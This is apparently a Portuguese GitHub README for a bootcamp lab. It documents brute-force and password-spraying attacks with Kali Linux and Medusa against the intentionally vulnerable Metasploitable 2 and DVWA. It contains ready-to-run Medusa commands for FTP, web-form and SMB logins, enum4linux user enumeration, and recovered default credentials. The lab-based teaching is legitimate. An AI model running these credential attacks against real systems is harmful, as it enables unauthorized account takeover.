# 🔐 Desafio de Segurança Cibernética - Medusa & Kali Linux

> **⚠️ AVISO LEGAL**: Este projeto é exclusivamente para fins educacionais em ambientes controlados. Nunca execute ataques em sistemas sem autorização expressa. O uso inadequado dessas técnicas pode resultar em consequências legais graves.

## 📋 Sobre o Projeto

Este repositório documenta a implementação prática de testes de segurança utilizando **Kali Linux** e a ferramenta **Medusa** para simular ataques de força bruta em ambientes vulneráveis controlados (Metasploitable 2 e DVWA). O objetivo é demonstrar vulnerabilidades comuns e propor medidas de mitigação eficazes.

### 🎯 Objetivos de Aprendizagem

- ✅ Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB)
- ✅ Utilizar Kali Linux e Medusa para auditoria de segurança
- ✅ Documentar processos técnicos de forma clara e estruturada
- ✅ Reconhecer vulnerabilidades comuns e propor mitigações
- ✅ Criar portfólio técnico no GitHub

## 🛠️ Tecnologias e Ferramentas

- **Kali Linux** - Distribuição Linux focada em segurança e testes de penetração
- **Medusa** - Ferramenta de força bruta modular e rápida
- **VirtualBox** - Software de virtualização
- **Metasploitable 2** - Máquina virtual intencionalmente vulnerável
- **DVWA** (Damn Vulnerable Web Application) - Aplicação web vulnerável

## 📁 Estrutura do Projeto

```
desafio-seguranca-medusa/
│
├── README.md                    # Documentação principal
├── wordlists/                   # Listas de palavras para testes
│   ├── usuarios.txt
│   ├── senhas_comuns.txt
│   └── senhas_ftp.txt
│
├── scripts/                     # Scripts de automação
    ├── ataque_ftp.sh
    ├── ataque_smb.sh
    └── verificar_servicos.sh
```

## 🚀 Configuração do Ambiente

### Pré-requisitos

1. **VirtualBox** instalado
2. **Kali Linux** (VM)
3. **Metasploitable 2** (VM)
4. Pelo menos 8GB de RAM disponível
5. 50GB de espaço em disco

### Configuração de Rede

Configure ambas as VMs em modo **Host-Only** ou **Internal Network** para isolamento:

```bash
# No VirtualBox, configure:
# Adapter 1: Host-Only Adapter
# Nome: vboxnet0 (ou criar uma nova rede)
```

### Instalação do Medusa no Kali Linux

```bash
# Atualizar repositórios
sudo apt update

# Instalar Medusa
sudo apt install medusa -y

# Verificar instalação
medusa -d
```

### Verificar Conectividade

```bash
# No Kali Linux, descobrir IP do Metasploitable
sudo netdiscover -r <IP_METASPLOITABLE>

# Ou usar nmap
nmap -sn <IP_METASPLOITABLE>

# Testar conectividade
ping <IP_METASPLOITABLE>
```

## 🎯 Cenários de Ataque Implementados

### 1️⃣ Ataque de Força Bruta em FTP

**Objetivo**: Quebrar credenciais de acesso ao serviço FTP.

```bash
# Verificar se o serviço FTP está ativo
nmap -p 21 <IP_METASPLOITABLE>

# Executar ataque com Medusa
medusa -h <IP_METASPLOITABLE> -u msfadmin -P wordlists/senhas_ftp.txt -M ftp

# Ataque com múltiplos usuários
medusa -h <IP_METASPLOITABLE> -U wordlists/usuarios.txt -P wordlists/senhas_comuns.txt -M ftp -t 4
```

**Resultado Esperado**: Identificação de credenciais fracas (ex: msfadmin:msfadmin)

### 2️⃣ Ataque em Formulário Web (DVWA)

**Objetivo**: Automatizar tentativas de login em formulário web.

```bash
# Primeiro, acessar DVWA em: http://<IP_METASPLOITABLE>/dvwa
# Configurar nível de segurança para "low"

# Ataque HTTP Form-Based
medusa -h <IP_METASPLOITABLE> -u admin -P wordlists/senhas_comuns.txt -M web-form \
  -m FORM:"/dvwa/login.php" -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
  -m DENY-SIGNAL:"Login failed"
```

### 3️⃣ Password Spraying em SMB

**Objetivo**: Testar uma senha comum contra múltiplos usuários.

```bash
# Enumerar usuários SMB
enum4linux -U <IP_METASPLOITABLE>

# Password Spraying (uma senha, vários usuários)
medusa -h <IP_METASPLOITABLE> -U wordlists/usuarios.txt -p password123 -M smbnt -t 1

# Força bruta tradicional em SMB
medusa -h <IP_METASPLOITABLE> -u administrator -P wordlists/senhas_comuns.txt -M smbnt
```

## 📊 Resultados e Análise

### Vulnerabilidades Identificadas

| Serviço | Vulnerabilidade | Severidade | Credenciais Encontradas |
|---------|----------------|------------|------------------------|
| FTP | Credenciais padrão | 🔴 Alta | msfadmin:msfadmin |
| SSH | Senha fraca | 🔴 Alta | user:user |
| SMB | Sem bloqueio de conta | 🟡 Média | service:service |
| Web | Sem proteção anti-brute force | 🟡 Média | admin:password |

### Tempo de Ataque

- **FTP**: ~2-5 minutos (wordlist de 100 senhas)
- **SMB**: ~10-15 minutos (wordlist de 500 senhas)
- **Web**: ~3-8 minutos (dependendo da configuração)

## 📖 Recursos Adicionais

### Documentação
- [Medusa Official Documentation](http://www.foofus.net/goons/jmk/medusa/medusa.html)
- [Kali Linux Tools](https://www.kali.org/tools/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

### Wordlists Recomendadas
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [CeWL](https://github.com/digininja/CeWL) - Criar wordlists customizadas

## 🤝 Contribuições

Contribuições são bem-vindas! Sinta-se à vontade para:

- Reportar bugs
- Sugerir novas funcionalidades
- Melhorar a documentação
- Compartilhar novos cenários de teste

## 📝 Licença

Este projeto é disponibilizado apenas para fins educacionais. Use com responsabilidade e ética.

## 👨‍💻 Autor

**Lucas**  
Desafio desenvolvido como parte do bootcamp DIO - Digital Innovation One

## 🙏 Agradecimentos

- DIO - Digital Innovation One pelo desafio proposto
- Comunidade de segurança cibernética
- Desenvolvedores das ferramentas open source utilizadas
